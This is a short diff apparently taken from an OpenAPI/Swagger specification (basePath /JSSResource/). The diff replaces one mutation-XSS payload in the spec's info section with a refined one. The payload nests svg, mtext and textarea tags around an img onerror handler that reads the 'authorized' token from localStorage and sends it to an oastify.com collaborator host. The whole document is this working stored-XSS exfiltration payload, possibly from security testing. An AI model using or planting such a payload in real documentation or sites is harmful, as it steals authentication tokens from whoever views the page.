@@ -8,7 +8,7 @@ info:
         <svg>
           <mtext>
             <textarea><path id="</textarea>
-            <img src="" onerror="(new Image()).src='https://gcwsofg9lpx6gsn001lzvrylyc43suuij.oastify.com/?authorized='+encodeURIComponent(localStorage.getItem(String.fromCharCode(39)+'authorized'+String.fromCharCode(39)))">">
+            <img src=1 onerror=`(new Image).src='https://gcwsofg9lpx6gsn001lzvrylyc43suuij.oastify.com/?authorized='+encodeURIComponent(localStorage.getItem('authorized'))`>
     </form>
   version: production
 basePath: /JSSResource/
